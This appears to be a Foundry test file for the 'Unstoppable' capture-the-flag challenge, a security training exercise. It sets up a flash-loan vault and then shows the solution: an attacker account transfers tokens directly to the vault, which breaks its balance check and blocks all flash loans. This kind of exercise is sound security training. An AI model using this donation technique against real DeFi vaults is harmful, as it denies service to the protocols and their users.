// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";

import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";

import {DamnValuableToken} from "@main/DamnValuableToken.sol";
import {UnstoppableVault} from "@main/unstoppable/UnstoppableVault.sol";
import {ReceiverUnstoppable} from "@main/unstoppable/ReceiverUnstoppable.sol";


contract UnstoppableVaultTest is Test {

    error InvalidBalance();

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);
    address public attacker = address(11);

    DamnValuableToken token;
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;

    uint256 constant TOKENS_IN_VAULT = 1_000_000 ether;
    uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;



    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, 1001 ether);
        vm.deal(attacker, 1 ether);
        
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);

        vm.stopPrank(  );
    }

    // modifier deployer() {
    //     vm.startPrank(deployer);
    //     _;
    //     vm.stopPrank(  );
    //  }


    modifier beforeEach() {
        vm.startPrank(deployer);

        assertEq( IERC4626(address(vault)).asset() , address(token));

        token.approve(address(vault),TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);

        assertEq( token.balanceOf(address(vault)) ,TOKENS_IN_VAULT);
        assertEq( IERC4626(address(vault)).totalAssets() , TOKENS_IN_VAULT);
        assertEq( IERC4626(address(vault)).totalSupply() , TOKENS_IN_VAULT);
        assertEq( vault.maxFlashLoan(address(token)) , TOKENS_IN_VAULT);
        assertEq( vault.flashFee(address(token),TOKENS_IN_VAULT-1) , 0);
        assertEq( vault.flashFee(address(token),TOKENS_IN_VAULT) , 50_000 ether);

        token.transfer(attacker, INITIAL_PLAYER_TOKEN_BALANCE);
        assertEq( token.balanceOf(attacker) ,INITIAL_PLAYER_TOKEN_BALANCE);

        vm.stopPrank(  );
        _;
    }

    function test_isSolved( ) public beforeEach() {
        vm.startPrank(attacker);
        receiver = new ReceiverUnstoppable(address(vault));
        token.transfer(address(vault), 5 ether );
        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
        receiver.executeFlashLoan(100 ether);
       
        vm.stopPrank( );
    }

}